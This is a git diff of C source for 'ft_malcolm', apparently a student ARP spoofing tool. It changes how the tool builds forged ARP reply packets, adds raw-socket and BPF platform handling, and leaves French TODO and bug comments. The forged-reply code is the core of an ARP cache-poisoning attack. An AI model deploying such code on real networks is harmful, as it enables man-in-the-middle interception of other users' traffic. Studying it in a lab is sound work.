@@ -19,7 +19,7 @@ int	spoofArp(ft_malcolm *malc)
 	ethhdr = (struct ether_header *)malc->msg;
 	arphdr = (struct ether_arp *)(ethhdr + 1);
 
-	if (getMacAddress(&localMac, malc->opt.ifName))
+	if (getIfMacAddress(&localMac, malc->ifName))
 		return EXIT_FAILURE;
 
     dprintf(STDOUT_FILENO, "interface: `%s` has MAC address equal to: %02x:%02x:%02x:%02x:%02x:%02x\n", 			malc->opt.ifName,
@@ -27,10 +27,14 @@ int	spoofArp(ft_malcolm *malc)
 		localMac.octet[2], localMac.octet[3],
 		localMac.octet[4], localMac.octet[5]);
 
+
+
+
+// TODO targetMac == address mac de target et localIP uniquement get par -i
 	/* fill ethernet header */
-	fillEtherPacket(ethhdr, &localMac, &malc->srcMac, ETHERTYPE_ARP);
+	fillEtherPacket(ethhdr, &malc->targetMac, &malc->srcMac, ETHERTYPE_ARP);
 	/* fill arp header */
-	fillArpPacket(arphdr, &malc->srcMac, &malc->targetMac, malc->srcIp, malc->targetIp, ARPOP_REPLY);
+	fillArpPacket(arphdr, &malc->srcMac, &localMac, malc->srcIp, malc->targetIp, ARPOP_REPLY);
 
 	/* Send package */
 	char macBuf1[INET_ADDRSTRLEN];
@@ -76,14 +80,14 @@ int		getInterfaces(ft_malcolm *malc, int all)
 		}
 		if_current=if_current->ifa_next;
 	}
-	dprintf(STDOUT_FILENO, "using [%s] %d\n", malc->used_ifs->ifa_name, IF_NAMESIZE);
+	dprintf(STDOUT_FILENO, "using interface [%s] %d\n", malc->used_ifs->ifa_name, IF_NAMESIZE);
 	return EXIT_SUCCESS;
 }
 
 
 int init_connection(ft_malcolm * malc, char **av)
 {
-	ft_memset(&malc->conn, '\0', sizeof(struct sockaddr_in));
+	// ft_memset(&malc->conn, '\0', sizeof(struct sockaddr_in));
 
 	/* Get interface name */
 	if (getInterfaces(malc, 0))
@@ -140,13 +144,14 @@ int init_connection(ft_malcolm * malc, char **av)
 	return EXIT_SUCCESS;
 }
 
-
+# ifdef LINUX
 uint32_t	ft_malcolm_linux(ft_malcolm *malc)
 {
 	int					enableBroadcast = 1;
 	struct sockaddr si_other;
 	// struct sockaddr_ll	socket_address;
-	dprintf(STDOUT_FILENO, "ftlinux\n");
+	if (malc->opt.verbose)
+		dprintf(STDOUT_FILENO, "Working on Linux\n");
 
 	// Create a socket enabled for receiving ARP packets
 	if ((malc->socket = socket(AF_PACKET, SOCK_RAW, ETH_P_ARP)) < 0)
@@ -186,6 +191,9 @@ uint32_t	ft_malcolm_linux(ft_malcolm *malc)
 
 	return EXIT_SUCCESS;
 }
+# endif //LINUX
+
+//BUG Surement une erreur: je répond à srcIp et non à l'emitteur de la request: c'est pas une bonne idée
 int	clean_quit(ft_malcolm *malc)
 {
 	dprintf(STDOUT_FILENO, "Cleaning program...\n");
@@ -193,16 +201,20 @@ int	clean_quit(ft_malcolm *malc)
 	freeifaddrs(malc->all_ifs);
 	return EXIT_SUCCESS;
 }
-
 # ifdef OSX
 
-int waitArpRequestOsx(ft_malcolm *malc)
+int		ft_malcolm_osx(ft_malcolm *malc)
 {
+	if (malc->opt.verbose)
+		dprintf(STDOUT_FILENO, "Working on OSX\n");
 	if (openBpfFile(&malc->socket, STDOUT_FILENO, malc->opt.verbose)
 		|| bpfSetOption(malc)
 		|| bpfCheckDlt(malc)
 		|| bpfSetFilter(malc))
+	{
+		dprintf(STDERR_FILENO, "ft_malcolm iniailization failed\n");
 		return EXIT_FAILURE;
+	}
 	if (read_packets(malc))
 		return EXIT_FAILURE;
 	close(malc->socket);
@@ -283,11 +295,9 @@ int main(int ac, char **av)
 	if (ft_malcolm_linux(&malc))
 		return EXIT_FAILURE;
 # elif defined OSX
-		if (waitArpRequestOsx(&malc))
-			return EXIT_FAILURE;
+	if (ft_malcolm_osx(&malc))
+		return EXIT_FAILURE;
 
-		/* Tell target that we are source */
-			// spoofArp(&malc);
 # endif
 	if (clean_quit(&malc))
 		return EXIT_FAILURE;
